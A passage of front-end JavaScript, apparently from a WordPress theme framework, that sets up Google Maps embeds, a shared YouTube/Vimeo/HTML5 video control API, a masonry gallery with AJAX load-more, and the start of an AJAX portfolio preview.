// afterwards applies the map to the container
// 
// -------------------------------------------------------------------------------------------


(function($)
{
    "use strict";

	$.AviaMapsAPI  =  function(options, container)
	{
		if(typeof window.av_google_map == 'undefined')
		{
			$.avia_utilities.log('Map creation stopped, var av_google_map not found'); return
		}
	
		// gatehr container and map data
		this.container	= container;
		this.$container	= $( container );
		this.$body  	= $('body');
		this.$mapid		= this.$container.data('mapid') - 1; 
		this.$data		= window.av_google_map[this.$mapid];
		this.retina 	= window.devicePixelRatio > 1;
		
		// set up the whole api object
		this._init( options );
	}
	
	$.AviaMapsAPI.apiFiles = 
	{
		loading: false, 
		finished: false, 
		src: 'https://maps.googleapis.com/maps/api/js?v=3.27&callback=aviaOnGoogleMapsLoaded' 
	}
	
  	$.AviaMapsAPI.prototype =
    {
    	_init: function()
    	{
    		this._bind_execution();
    		this._getAPI();
    	},
    	
    	_getAPI: function( )
		{	
			//make sure the api file is loaded only once
			if((typeof window.google == 'undefined' || typeof window.google.maps == 'undefined') && $.AviaMapsAPI.apiFiles.loading == false)
			{	
				$.AviaMapsAPI.apiFiles.loading = true;
				var script 	= document.createElement('script');
				script.type = 'text/javascript';	
				script.src 	= $.AviaMapsAPI.apiFiles.src;
				
				if(avia_framework_globals.gmap_api != 'undefined' && avia_framework_globals.gmap_api != "")
				{
					script.src 	+= "&key=" + avia_framework_globals.gmap_api;
				}
				
      			document.body.appendChild(script);
			}
			else if((typeof window.google != 'undefined' && typeof window.google.maps != 'undefined') || $.AviaMapsAPI.apiFiles.loading == false)
			//else if($.AviaMapsAPI.apiFiles.finished === true)
			{
				this._applyMap();
			}
		},
		
		_bind_execution: function()
		{
			this.$body.on('av-google-maps-api-loaded', $.proxy( this._applyMap, this) );
		},
		
		_applyMap: function()
		{
			if(typeof this.map != 'undefined') return;
			if(!this.$data.marker || !this.$data.marker[0] || !this.$data.marker[0].long || !this.$data.marker[0].long)
			{
				$.avia_utilities.log('Latitude or Longitude missing', 'map-error'); 
				return;
			}
			
			var _self = this,
				mobile_drag = $.avia_utilities.isMobile ? this.$data.mobile_drag_control : true,
				zoomValue 	= this.$data.zoom == "auto" ? 10 : this.$data.zoom;
		
			var mapTypeControl = false;
			var mapTypeId = google.maps.MapTypeId.ROADMAP;
			var mapTypeControlOptions = google.maps.MapTypeControlStyle.DROPDOWN_MENU;
			
			switch( this.$data.maptype_control )
			{
				case 'dropdown':
					mapTypeControl = true;
					mapTypeControlOptions = google.maps.MapTypeControlStyle.DROPDOWN_MENU;
					break;
				case 'horizontal':
					mapTypeControl = true;
					mapTypeControlOptions = google.maps.MapTypeControlStyle.HORIZONTAL_BAR;
					break;
				case 'default':
					mapTypeControl = true;
					mapTypeControlOptions = google.maps.MapTypeControlStyle.DEFAULT;
					break;
				default:
					mapTypeControl = false;
					mapTypeControlOptions = google.maps.MapTypeControlStyle.DROPDOWN_MENU;
					break;
			}
			
			switch( this.$data.maptype_id )
			{
				case 'SATELLITE':
					mapTypeId = google.maps.MapTypeId.SATELLITE;
					break;
				case 'HYBRID':
					mapTypeId = google.maps.MapTypeId.HYBRID;
					break;
				case 'TERRAIN':
					mapTypeId = google.maps.MapTypeId.TERRAIN;
					break;
				default:
					mapTypeId = google.maps.MapTypeId.ROADMAP;
			}
			
			this.mapVars = {
				mapMaker: false, //mapmaker tiles are user generated content maps. might hold more info but also be inaccurate
				backgroundColor:'transparent',
				streetViewControl: false,
				zoomControl: this.$data.zoom_control,
				//draggable: mobile_drag,
				gestureHandling: 'cooperative',
				scrollwheel: false,
				zoom: zoomValue,
				mapTypeControl: mapTypeControl,
				mapTypeControlOptions: {style:mapTypeControlOptions},
				mapTypeId: mapTypeId,
				center: new google.maps.LatLng(this.$data.marker[0].lat, this.$data.marker[0].long),
				styles:[{featureType: "poi", elementType: "labels", stylers: [ { visibility: "off" }] }]
			};

			this.map = new google.maps.Map(this.container, this.mapVars);
		
			this._applyMapStyle();
			
			if(this.$data.zoom == "auto")
			{
				this._setAutoZoom();
			}
			
			google.maps.event.addListenerOnce(this.map, 'tilesloaded', function() {	
				_self._addMarkers();
			});
		},
		
		_setAutoZoom: function()
		{
			var bounds = new google.maps.LatLngBounds();
			
			for (var key in this.$data.marker) 
			{
				bounds.extend( new google.maps.LatLng (this.$data.marker[key].lat , this.$data.marker[key].long) );
			}
			
			this.map.fitBounds(bounds);
		},
		
		_applyMapStyle: function()
		{
			var stylers = [], style = [], mapType, style_color = "";
			
			if(this.$data.hue != "") stylers.push({hue: this.$data.hue});
			if(this.$data.saturation != "") stylers.push({saturation: this.$data.saturation});
			
			if(stylers.length)
			{
				style = [{
					      featureType: "all",
					      elementType: "all",
					      stylers: stylers
					    }, {
					      featureType: "poi",
					      stylers: [
						  	{ visibility: "off" }
					      ]
					    }];
					    
				
				if(this.$data.saturation == "fill")
				{
					   
					style_color = this.$data.hue || "#242424";
					
					var c = style_color.substring(1);      // strip #
					var rgb = parseInt(c, 16);   // convert rrggbb to decimal
					var r = (rgb >> 16) & 0xff;  // extract red
					var g = (rgb >>  8) & 0xff;  // extract green
					var b = (rgb >>  0) & 0xff;  // extract blue
					
					var luma = 0.2126 * r + 0.7152 * g + 0.0722 * b; // per ITU-R BT.709
					var lightness = 1;
					var street_light = 2;
					
					if (luma > 60) {
					    lightness = -1;
					    street_light = 3;
					}
					if (luma > 220) {
					    lightness = -2;
					    street_light = -2;
					}
					
				style = [
{"featureType":"all","elementType":"all","stylers":[{"color":style_color},{"lightness":0}]},
{"featureType":"all","elementType":"labels.text.fill","stylers":[{"color":style_color},{"lightness":(25 * street_light)}]},
{"featureType":"all","elementType":"labels.text.stroke","stylers":[{"visibility":"on"},{"color":style_color},{"lightness":3}]},
{"featureType":"all","elementType":"labels.icon","stylers":[{"visibility":"off"}]},
{"featureType":"administrative","elementType":"geometry.fill","stylers":[{"color":style_color},{"lightness":30}]},
{"featureType":"administrative","elementType":"geometry.stroke","stylers":[{"color":style_color},{"lightness":30},{"weight":1.2}]},
{"featureType":"landscape","elementType":"geometry","stylers":[{visibility: 'simplified'},{"color":style_color},{"lightness":3}]},
{"featureType":"poi","elementType":"geometry","stylers":[{ "visibility": "off" }]},
{"featureType":"road.highway","elementType":"geometry.fill","stylers":[{"color":style_color},{"lightness":-3}]},
{"featureType":"road.highway","elementType":"geometry.stroke","stylers":[{"color":style_color},{"lightness":2},{"weight":0.2}]},
{"featureType":"road.arterial","elementType":"geometry","stylers":[{"color":style_color},{"lightness":-3}]},
{"featureType":"road.local","elementType":"geometry","stylers":[{"color":style_color},{"lightness":-3}]},
{"featureType":"transit","elementType":"geometry","stylers":[{"color":style_color},{"lightness":-3}]},
{"featureType":"water","elementType":"geometry","stylers":[{"color":style_color},{"lightness":-20}]}
						];
				}	
				
				mapType = new google.maps.StyledMapType(style, { name:"av_map_style" });
				this.map.mapTypes.set('av_styled_map', mapType);
				this.map.setMapTypeId('av_styled_map');
			}
		},
		
		_addMarkers: function()
		{
			for (var key in this.$data.marker) 
			{	
				var _self = this;
				
				(function(key, _self) 
				{
					setTimeout(function()
					{
							var marker = "";
							
							if(!_self.$data.marker[key] || !_self.$data.marker[key].long || !_self.$data.marker[key].long)
							{
								$.avia_utilities.log('Latitude or Longitude for single marker missing', 'map-error'); 
								return;
							}
							
							_self.$data.LatLng = new google.maps.LatLng(_self.$data.marker[key].lat, _self.$data.marker[key].long);
							
							var markerArgs = {
			        		  flat: false,
						      position: _self.$data.LatLng,
						      animation: google.maps.Animation.BOUNCE,
						      map: _self.map,
						      title: _self.$data.marker[key].address,
						      optimized: false
						    };
						    
						    //set a custom marker image if available. also set the size and reduce the marker on retina size so its sharp
						    if(_self.$data.marker[key].icon && _self.$data.marker[key].imagesize)
						    { 
						    	var size = _self.$data.marker[key].imagesize, half = "", full = "";
						    	
						    	if(_self.retina && size > 40) size = 40;			//retina downsize to at least half the px size
						    	half = new google.maps.Point(size / 2, size ) ; 	//used to position the marker
						    	full = new google.maps.Size(size , size ) ; 		//marker size
						    	markerArgs.icon = new google.maps.MarkerImage(_self.$data.marker[key].icon, null, null, half, full);
						    }
							
			        		marker = new google.maps.Marker(markerArgs);
			        		
			        		setTimeout(function(){ marker.setAnimation(null); _self._infoWindow(_self.map, marker, _self.$data.marker[key]); },500);
			        		
		        	},200 * (parseInt(key,10) + 1));
		        		
		        }(key, _self));
    		}
		},
		
		_infoWindow: function(map, marker, data)
		{
			var info = $.trim(data.content);
			
			if(info != "")
			{
				var infowindow = new google.maps.InfoWindow({
					content: info
				});
				
				google.maps.event.addListener(marker, 'click', function() {
				    infowindow.open(map,marker);
				});
				
				if(data.tooltip_display) infowindow.open(map,marker);
			}
		}
		
    	
    }

    //simple wrapper to call the api. makes sure that the api data is not applied twice
    $.fn.aviaMaps = function( options )
    {
    	return this.each(function()
    	{	
    		var self = $.data( this, 'aviaMapsApi' );
    		
    		if(!self)
    		{
    			self = $.data( this, 'aviaMapsApi', new $.AviaMapsAPI( options, this ) );
    		}
    	});
    }
    
})( jQuery );

//this function is executed once the api file is loaded
window.aviaOnGoogleMapsLoaded = function(){ $('body').trigger('av-google-maps-api-loaded'); $.AviaMapsAPI.apiFiles.finished = true; };


// -------------------------------------------------------------------------------------------
// 
// AVIA VIDEO API - make sure that youtube, vimeo and html 5 use the same interface
// 
// requires froogaloop vimeo library and youtube iframe api (yt can be loaded async)
// 
// -------------------------------------------------------------------------------------------


(function($)
{
    "use strict";

	$.AviaVideoAPI  =  function(options, video, option_container)
	{	
		// actual video element. either iframe or video
		this.$video	= $( video );
		
		// container where the AviaVideoAPI object will be stored as data, and that can receive events like play, pause etc 
		// also the container that allows to overwrite javacript options by adding html data- attributes
		this.$option_container = option_container ? $( option_container ) : this.$video; 
		
		//mobile device?
		this.isMobile 	= $.avia_utilities.isMobile;
		
		//iamge fallback use
		this.fallback = this.isMobile ? this.$option_container.is('.av-mobile-fallback-image') : false;
		
		if(this.fallback) return;
		
		// set up the whole api object
		this._init( options );
		
	}

	$.AviaVideoAPI.defaults  = {
	
		loop: false,
		mute: false,
		controls: false,
		events: 'play pause mute unmute loop toggle reset unload'

	};
	
	$.AviaVideoAPI.apiFiles =
    {
    	youtube : {loaded: false, src: 'https://www.youtube.com/iframe_api' }
    }
	
  	$.AviaVideoAPI.prototype =
    {
    	_init: function( options )
    	{	
			// set slider options
			this.options = this._setOptions(options);
			
			// info which video service we are using: html5, vimeo or youtube
			this.type = this._getPlayerType();
			
			// store the player object to the this.player variable created by one of the APIs (mediaelement, youtube, vimeo)
			this._setPlayer();			
			
			// set to true once the events are bound so it doesnt happen a second time by accident or racing condition
			this.eventsBound = false;
			
			// info if the video is playing
			this.playing = false;
			
			//set css class that video is currently not playing
			this.$option_container.addClass('av-video-paused');
			
			//play pause indicator
			this.pp = $.avia_utilities.playpause(this.$option_container);
    	},
		
		
    	//set the video options by first merging the default options and the passed options, then checking the video element if any data attributes overwrite the option set
    	_setOptions: function(options)
		{	
			var newOptions 	= $.extend( true, {}, $.AviaVideoAPI.defaults, options ),
				htmlData 	= this.$option_container.data(),
				i 			= "";

			//overwritte passed option set with any data properties on the html element
			for (i in htmlData)
			{
				if (htmlData.hasOwnProperty(i) && (typeof htmlData[i] === "string" || typeof htmlData[i] === "number" || typeof htmlData[i] === "boolean"))
				{
					newOptions[i] = htmlData[i]; 
				}
			}
		
			return newOptions;
		},
		
		
		//get the player type
		_getPlayerType: function()
		{
			var vid_src = this.$video.get(0).src || this.$video.data('src');
			
			
			if(this.$video.is('video')) 				return 'html5';
			if(this.$video.is('.av_youtube_frame')) 	return 'youtube';
			if(vid_src.indexOf('vimeo.com') != -1 ) 	return 'vimeo';
			if(vid_src.indexOf('youtube.com') != -1) 	return 'youtube';
		},
		
		//get the player object
		_setPlayer: function()
		{
			var _self = this;
			
			switch(this.type)
			{
				case "html5": 	
				
					this.player = this.$video.data('mediaelementplayer');  
					this._playerReady(); 
					
				break; 
					
				case "vimeo": 	
					
					this.player = Froogaloop(this.$video.get(0)); 
					this._playerReady(); 
					
				break;
					
				case "youtube": 
				
					this._getAPI(this.type);
					$('body').on('av-youtube-iframe-api-loaded', function(){ _self._playerReady(); });
					
				break;
			}
		},
		
		_getAPI: function( api )
		{	
			//make sure the api file is loaded only once
			if($.AviaVideoAPI.apiFiles[api].loaded === false)
			{	
				$.AviaVideoAPI.apiFiles[api].loaded = true;
				//load the file async
				var tag		= document.createElement('script'),
					first	= document.getElementsByTagName('script')[0];
					
				tag.src = $.AviaVideoAPI.apiFiles[api].src;
      			first.parentNode.insertBefore(tag, first);
			}
		},
		
		
		
		//wait for player to be ready, then bind events
		_playerReady: function()
		{	
			var _self = this;
			
			this.$option_container.on('av-video-loaded', function(){ _self._bindEvents(); });
			
			switch(this.type)
			{
				case "html5": 
						
					this.$video.on('av-mediajs-loaded', function(){ _self.$option_container.trigger('av-video-loaded'); });
					this.$video.on('av-mediajs-ended' , function(){ _self.$option_container.trigger('av-video-ended');  });
					
				break;
				case "vimeo": 	
					
					//finish event must be applied after ready event for firefox
					_self.player.addEvent('ready',  function(){ _self.$option_container.trigger('av-video-loaded'); 
					_self.player.addEvent('finish', function(){ _self.$option_container.trigger('av-video-ended');  });
					}); 
					
					// vimeo sometimes does not fire. fallback jquery load event should fix this
					// currently not used because it causes firefox problems
					/*
					this.$video.load(function()
					{ 	
						if(_self.eventsBound == true || typeof _self.eventsBound == 'undefined') return;
				        _self.$option_container.trigger('av-video-loaded');
						$.avia_utilities.log('VIMEO Fallback Trigger');
				    });
					*/
					
				
				break;
				
				case "youtube": 
					
					var params = _self.$video.data();
					
					if(_self._supports_video()) params.html5 = 1;
					
					_self.player = new YT.Player(_self.$video.attr('id'), {
						videoId: params.videoid,
						height: _self.$video.attr('height'),
						width: _self.$video.attr('width'),
						playerVars: params,
						events: {
						'onReady': function(){ _self.$option_container.trigger('av-video-loaded'); },
						'onError': function(player){ $.avia_utilities.log('YOUTUBE ERROR:', 'error', player); },
						'onStateChange': function(event){ 
							if (event.data === YT.PlayerState.ENDED)
							{	
								var command = _self.options.loop != false ? 'loop' : 'av-video-ended';
								_self.$option_container.trigger(command); 
							} 
						  }
						}
					});
					
					
				break;
			}
			
			//fallback always trigger after 2 seconds
			setTimeout(function()
			{ 	
				if(_self.eventsBound == true || typeof _self.eventsBound == 'undefined' || _self.type == 'youtube' ) { return; }
				$.avia_utilities.log('Fallback Video Trigger "'+_self.type+'":', 'log', _self);
				
				_self.$option_container.trigger('av-video-loaded'); 
				
			},2000);
			
		},
		
		//bind events we should listen to, to the player
		_bindEvents: function()
		{	
			if(this.eventsBound == true || typeof this.eventsBound == 'undefined')
			{
				return;
			}
			
			var _self = this, volume = 'unmute';
			
			this.eventsBound = true;
			
			this.$option_container.on(this.options.events, function(e)
			{
				_self.api(e.type);
			});
			
			if(!_self.isMobile)
			{
				//set up initial options
				if(this.options.mute != false) { volume = "mute"; 	 }
				if(this.options.loop != false) { _self.api('loop'); }
				
				_self.api(volume);
			}
			
			//set timeout to prevent racing conditions with other scripts
			setTimeout(function()
			{
				_self.$option_container.trigger('av-video-events-bound').addClass('av-video-events-bound');
			},50);
		},
		
		
		_supports_video: function() {
		  return !!document.createElement('video').canPlayType;
		},
		
		
		/************************************************************************
		PUBLIC Methods
		*************************************************************************/
		
		api: function( action )
		{	
			//commands on mobile can not be executed if the player was not started manually 
			if(this.isMobile && !this.was_started()) return;
			
			// prevent calling of unbound function
			if(this.options.events.indexOf(action) === -1) return;
			
			// broadcast that the command was executed
			this.$option_container.trigger('av-video-'+action+'-executed');
			
			// calls the function based on action. eg: _html5_play()
			if(typeof this[ '_' + this.type + '_' + action] == 'function')
			{
				this[ '_' + this.type + '_' + action].call(this);
			}
			
			//call generic function eg: _toggle() or _play()
			if(typeof this[ '_' + action] == 'function')
			{
				this[ '_' + action].call(this);
			}
			
		},
		
		was_started: function()
		{
			if(!this.player) return false;
		
			switch(this.type)
			{
				case "html5": 
					if(this.player.getCurrentTime() > 0) return true; 
				break; 
					
				case "vimeo": 	
					if(this.player.api('getCurrentTime') > 0) return true; 
				break;
					
				case "youtube": 
					if(this.player.getPlayerState() !== -1) return true; 
				break;
			}
			
			return false;
		},
		
		/************************************************************************
		Generic Methods, are always executed and usually set variables
		*************************************************************************/
		_play: function()
		{
			this.playing = true;
			this.$option_container.addClass('av-video-playing').removeClass('av-video-paused');
		},
		
		_pause: function()
		{
			this.playing = false;
			this.$option_container.removeClass('av-video-playing').addClass('av-video-paused');
		},
		
		_loop: function()
		{
			this.options.loop = true;
		},
		
		_toggle: function( )
		{
			var command = this.playing == true ? 'pause' : 'play';
			
			this.api(command);
			this.pp.set(command);
		},
		
		
		/************************************************************************
		VIMEO Methods
		*************************************************************************/
		
		_vimeo_play: function( )
		{	
			this.player.api('play');
		},
		
		_vimeo_pause: function( )
		{
			this.player.api('pause');	
		},
		
		_vimeo_mute: function( )
		{
			this.player.api('setVolume', 0);
		},
		
		_vimeo_unmute: function( )
		{
			this.player.api('setVolume', 0.7);
		},
		
		_vimeo_loop: function( )
		{
			// currently throws error, must be set in iframe
			// this.player.api('setLoop', true);
		},
		
		_vimeo_reset: function( )
		{
			this.player.api('seekTo',0);
		},
		
		_vimeo_unload: function()
		{
			this.player.api('unload');
		},
		
		/************************************************************************
		YOUTUBE Methods
		*************************************************************************/		
		
		_youtube_play: function( )
		{
			this.player.playVideo();
		},
		
		_youtube_pause: function( )
		{
			this.player.pauseVideo()
		},
		
		_youtube_mute: function( )
		{
			this.player.mute();
		},
		
		_youtube_unmute: function( )
		{
			this.player.unMute();
		},
		
		_youtube_loop: function( )
		{	
			// does not work properly with iframe api. needs to manual loop on "end" event
			// this.player.setLoop(true); 
			if(this.playing == true) this.player.seekTo(0);
		},
		
		_youtube_reset: function( )
		{
			this.player.stopVideo();
		},
		
		_youtube_unload: function()
		{
			this.player.clearVideo();
		},
		
		/************************************************************************
		HTML5 Methods
		*************************************************************************/
		
		_html5_play: function( )
		{
			//disable stoping of other videos in case the user wants to run section bgs
			this.player.options.pauseOtherPlayers = false;
			this.player.play();
		},
		
		_html5_pause: function( )
		{
			this.player.pause();
		},
		
		_html5_mute: function( )
		{
			this.player.setMuted(true);
		},
		
		_html5_unmute: function( )
		{
			this.player.setVolume(0.7);
		},
		
		_html5_loop: function( )
		{
			this.player.options.loop = true;
		},
		
		_html5_reset: function( )
		{	
			this.player.setCurrentTime(0);	
		},
		
		_html5_unload: function()
		{
			this._html5_pause();
			this._html5_reset();
		}
    }

    //simple wrapper to call the api. makes sure that the api data is not applied twice
    $.fn.aviaVideoApi = function( options , apply_to_parent)
    {
    	return this.each(function()
    	{	
    		// by default save the object as data to the initial video. 
    		// in the case of slideshows its more benefitial to save it to a parent element (eg: the slide)
    		var applyTo = this;
    		
    		if(apply_to_parent)
    		{
    			applyTo = $(this).parents(apply_to_parent).get(0);
    		}
    		
    		var self = $.data( applyTo, 'aviaVideoApi' );
    		
    		if(!self)
    		{
    			self = $.data( applyTo, 'aviaVideoApi', new $.AviaVideoAPI( options, this, applyTo ) );
    		}
    	});
    }
    
})( jQuery );

window.onYouTubeIframeAPIReady = function(){ $('body').trigger('av-youtube-iframe-api-loaded'); };



// -------------------------------------------------------------------------------------------
// Masonry
// -------------------------------------------------------------------------------------------

$.fn.avia_masonry = function(options)
{
	//return if we didnt find anything
	if(!this.length) return this;
	
	var the_body = $('body'),
		the_win	 = $(window),
		isMobile = $.avia_utilities.isMobile,
		loading = false,
		methods = {
	
		
		masonry_filter: function()
		{
			var current		= $(this),
				linktext	= current.html(),
		  		selector	= current.data('filter'),
		  		masonry 	= current.parents('.av-masonry:eq(0)'),
		  		container 	= masonry.find('.av-masonry-container:eq(0)'),
		  		links		= masonry.find('.av-masonry-sort a'),
		  		activeCat	= masonry.find('.av-current-sort-title');
				
				links.removeClass('active_sort');
				current.addClass('active_sort');
				container.attr('id', 'masonry_id_'+selector);
				
				if(activeCat.length) activeCat.html(linktext);
				
				methods.applyMasonry(container, selector, function()
				{
					container.css({overflow:'visible'});
				});
				
				return false;
		},
		
		applyMasonry: function(container, selector, callback)
		{
			var filters = selector ? {filter: '.'+selector} : {};
			
			filters['layoutMode'] = 'packery';
			filters['packery'] = {gutter:0};
			filters['percentPosition'] = true;
			filters['itemSelector'] = "a.isotope-item, div.isotope-item";
			
			container.isotope(filters, function()
			{
				the_win.trigger('av-height-change');
			});
			
			if(typeof callback === 'function')
			{
				setTimeout(callback, 0);
			}
		},
		
		show_bricks: function(bricks, callback)
		{
			bricks.each(function(i)
			{
				var currentLink 	= $(this),
					browserPrefix 	= $.avia_utilities.supports('transition'),
					multiplier		= isMobile ? 0 : 100;
				
				setTimeout(function()
				{
					if(browserPrefix === false)
					{
						currentLink.css({visibility:"visible", opacity:0}).animate({opacity:1},1500);
					}
					else
					{
						currentLink.addClass('av-masonry-item-loaded');
					}
					
					if(i == bricks.length - 1 && typeof callback == 'function')
					{
						callback.call();
						the_win.trigger('av-height-change');
					}
					
				}, (multiplier * i));
			});
		},
		
		loadMore: function(e)
		{
			e.preventDefault();
			
			if(loading) return false;
			
			loading = true;
		
			var current		= $(this),
		  		data		= current.data(),
		  		masonry 	= current.parents('.av-masonry:eq(0)'),
		  		container	= masonry.find('.av-masonry-container'),
		  		items		= masonry.find('.av-masonry-entry'),
		  		loader		= $.avia_utilities.loading(),
		  		finished	= function(){ loading = false; loader.hide(); the_body.trigger('av_resize_finished'); };
		  			  	
		  	//calculate a new offset	
		  	if(!data.offset){ data.offset = 0; }	
		  	data.offset += data.items;
		  	data.action = 'avia_ajax_masonry_more';
		  	data.loaded = []; //prevents duplicate entries from beeing loaded when randomized is active
		  	
		  	items.each(function(){
			  	var item_id = $(this).data('av-masonry-item');
			  	if(item_id) data.loaded.push( item_id );
		  	});
		  	
		  	 $.ajax({
				url: avia_framework_globals.ajaxurl,
				type: "POST",
				data:data,
				beforeSend: function()
				{
					loader.show();
				},
				success: function(response)
				{
					if(response.indexOf("{av-masonry-loaded}") !== -1)
					{
						//fetch the response. if any php warnings were displayed before rendering of the items the are removed by the string split
						var response  = response.split('{av-masonry-loaded}'),
							new_items = $(response.pop()).filter('.isotope-item');
							
							//check if we got more items than we need. if not we have reached the end of items
							if(new_items.length > data.items)
							{
								new_items = new_items.not(':last');
							}
							else
							{
								current.addClass('av-masonry-no-more-items');
							}
							
							var load_container = $('<div class="loadcontainer"></div>').append(new_items);
							
							
							
							$.avia_utilities.preload({container: load_container, single_callback:  function()
							{
								var links = masonry.find('.av-masonry-sort a'),
									filter_container = masonry.find('.av-sort-by-term'),
									allowed_filters = filter_container.data("av-allowed-sort");
								
								filter_container.hide();
								
								loader.hide();
								container.isotope( 'insert', new_items); 
								$.avia_utilities.avia_ajax_call(masonry);
								setTimeout( function(){ methods.show_bricks( new_items , finished); },150);
								setTimeout(function(){ the_win.trigger('av-height-change'); }, 550);
								if(links)
								{
									$(links).each(function(filterlinkindex)
									{
										var filterlink = $(this),
										sort = filterlink.data('filter');

										if(new_items)
										{
										    $(new_items).each(function(itemindex){
										        var item = $(this);
												
										        if(item.hasClass(sort) && allowed_filters.indexOf(sort) !== -1)
										        {
										            var term_count = filterlink.find('.avia-term-count').text();
										            filterlink.find('.avia-term-count').text(' ' + (parseInt(term_count) + 1) + ' ');
										
										            if(filterlink.hasClass('avia_hide_sort'))
										            {
										                filterlink.removeClass('avia_hide_sort').addClass('avia_show_sort');
										                masonry.find('.av-masonry-sort .'+sort+'_sep').removeClass('avia_hide_sort').addClass('avia_show_sort');
										                masonry.find('.av-masonry-sort .av-sort-by-term').removeClass('hidden');
										            }
										        }
										    });
										}
									});

								}

                                				filter_container.fadeIn();
							}
						});
					}
					else
					{
						finished();
					}
				},
				error: finished,
				complete: function()
				{
				    
				}
			});
		}

	};

	return this.each(function()
	{	
		var masonry			= $(this),
			container 		= masonry.find('.av-masonry-container'),
			bricks			= masonry.find('.isotope-item'), 
			filter			= masonry.find('.av-masonry-sort').css({visibility:"visible", opacity:0}).on('click', 'a',  methods.masonry_filter),
			load_more		= masonry.find('.av-masonry-load-more').css({visibility:"visible", opacity:0});
			
		$.avia_utilities.preload({container: container, single_callback:  function()
		{
			var start_animation = function()
			{ 
				filter.animate({opacity:1}, 400);
				
				//fix for non aligned elements because of scrollbar
				if(container.outerHeight() + container.offset().top + $('#footer').outerHeight() > $(window).height())
				{
					$('html').css({'overflow-y':'scroll'});
				}
				
				methods.applyMasonry(container, false, function()
				{
					masonry.addClass('avia_sortable_active');
					container.removeClass('av-js-disabled '); 
				});
				
				methods.show_bricks(bricks, function()
				{
					load_more.css({opacity:1}).on('click',  methods.loadMore);
				});
				
				//container.isotope( 'reLayout' );

			};
			
			if(isMobile)
			{
				start_animation();
			}
			else
			{
				masonry.waypoint(start_animation , { offset: '80%'} );
			}
					
			// update columnWidth on window resize
			$(window).on( 'debouncedresize', function()
			{
			  	methods.applyMasonry(container, false, function()
				{
					masonry.addClass('avia_sortable_active');
				});
			});
		}
	});
		
		
	});
};




	
// -------------------------------------------------------------------------------------------
// Avia AJAX Portfolio
// -------------------------------------------------------------------------------------------

(function($)
{ 
	"use strict";
	$.avia_utilities = $.avia_utilities || {};
	
	$.fn.avia_portfolio_preview = function(passed_options) 
	{	
		var win  = $(window),
		the_body = $('body'),
		isMobile = $.avia_utilities.isMobile,
		defaults = 
		{
			open_in:	'.portfolio-details-inner',
			easing:		'easeOutQuint',
			timing:		800,
			transition:	'slide' // 'fade' or 'slide'
		},
		
		options = $.extend({}, defaults, passed_options);
	
		return this.each(function()
		{	
			var container			= $(this),
				portfolio_id		= container.data('portfolio-id'),
				target_wrap			= $('.portfolio_preview_container[data-portfolio-id="' + portfolio_id + '"]'),
				target_container	= target_wrap.find(options.open_in),
				items				= container.find('.grid-entry'),
				content_retrieved	= {},
				is_open				= false,
				animating			= false,
				index_open			= false,
				ajax_call			= false,
				methods,
				controls,
				loader				= $.avia_utilities.loading();
				
			methods = 
			{
				load_item: function(e)
				{
					e.preventDefault();

					var link			= $(this),
						post_container	= link.parents('.post-entry:eq(0)'),
						post_id			= "ID_" + post_container.data('ajax-id'),
						clickedIndex	= items.index(post_container);
					
					//check if current item is the clicked item or if we are currently animating
					if(post_id === is_open || animating == true) 
					{
						return false;
					}
					
					animating = true;
					
					container.find('.active_portfolio_item').removeClass('active_portfolio_item');
					post_container.addClass('active_portfolio_item');
					loader.show();
					
					methods.ajax_get_contents(post_id, clickedIndex);
				},
				
				scroll_top: function()
				{
					setTimeout(function()
					{
						var target_offset = target_wrap.offset().top - 175,
							window_offset = win.scrollTop();
											
						if(window_offset > target_offset || target_offset - window_offset > 100  )
						{
							$('html:not(:animated),body:not(:animated)').animate({ scrollTop: target_offset }, options.timing, options.easing);
						}
					},10);
				},
				
				attach_item: function(post_id)
				{
					content_retrieved[post_id] = $(content_retrieved[post_id]).appendTo(target_container);
					ajax_call = true;
				},
				
				remove_video: function()
				{
					var del = target_wrap.find('iframe, .avia-video').parents('.ajax_slide:not(.open_slide)');	
					
						if(del.length > 0)
						{
							del.remove();
							content_retrieved["ID_" + del.data('slideId')] = undefined;
						}
				},
				
				show_item: function(post_id, clickedIndex)
				{
				
					//check if current item is the clicked item or if we are currently animating
					if(post_id === is_open) 
					{
						return false;
					}
					animating = true;
					
					
					loader.hide();
					
					if(false === is_open)
					{
						target_wrap.addClass('open_container');
						content_retrieved[post_id].addClass('open_slide');
						
						methods.scroll_top();
						
						target_wrap.css({display:'none'}).slideDown(options.timing, options.easing, function()
						{
							if(ajax_call)
							{ 
								activate_shortcode_scripts(content_retrieved[post_id]); 
								$.avia_utilities.avia_ajax_call(content_retrieved[post_id]);
								the_body.trigger('av_resize_finished');
								ajax_call = false; 
							}
							
							methods.remove_video();
							the_body.trigger('av_resize_finished');
						});
						
							index_open	= clickedIndex;
							is_open		= post_id;
							animating	= false;
						
						
						
					}
					else
					{
						methods.scroll_top();
					
						var initCSS = { zIndex:3 },
							easing	= options.easing;
							
						if(index_open > clickedIndex) { initCSS.left = '-110%'; }
						if(options.transition === 'fade'){ initCSS.left = '0%'; initCSS.opacity = 0; easing = 'easeOutQuad'; }
						
						//fixate height for container during animation
						target_container.height(target_container.height()); //outerHeight = border problems?
						
						content_retrieved[post_id].css(initCSS).avia_animate({'left':"0%", opacity:1}, options.timing, easing);
						content_retrieved[is_open].avia_animate({opacity:0}, options.timing, easing, function()
						{
							content_retrieved[is_open].attr({'style':""}).removeClass('open_slide');
							content_retrieved[post_id].addClass('open_slide');
																										  //+ 2 fixes border problem (slides move up and down 2 px on transition)
							target_container.avia_animate({height: content_retrieved[post_id].outerHeight() + 2}, options.timing/2, options.easing, function()
							{
								target_container.attr({'style':""});
								is_open		= post_id;
								index_open	= clickedIndex;
								animating	= false;
								
								methods.remove_video();
								if(ajax_call)
								{ 
									the_body.trigger('av_resize_finished');
									activate_shortcode_scripts(content_retrieved[post_id]); 
									$.avia_utilities.avia_ajax_call(content_retrieved[post_id]);
									ajax_call = false; 
								}
	
							});
							
						});		
					}
				},
				
				ajax_get_contents: function(post_id, clickedIndex)
				{
					if(content_retrieved[post_id] !== undefined)
					{
						methods.show_item(post_id, clickedIndex);
						return;
					}
					
					content_retrieved[post_id] = $('#avia-tmpl-portfolio-preview-' + post_id.replace(/ID_/,"")).html();
					
					//this line is necessary to prevent w3 total cache from messing up the portfolio if inline js is compressed
					content_retrieved[post_id] = content_retrieved[post_id].replace('/*<![CDATA[*/','').replace('*]]>','');
					
					methods.attach_item(post_id);
					
					$.avia_utilities.preload({container: content_retrieved[post_id] , single_callback:  function(){ methods.show_item(post_id, clickedIndex); }});
				},
				
				add_controls: function()
				{
					controls = target_wrap.find('.ajax_controlls');

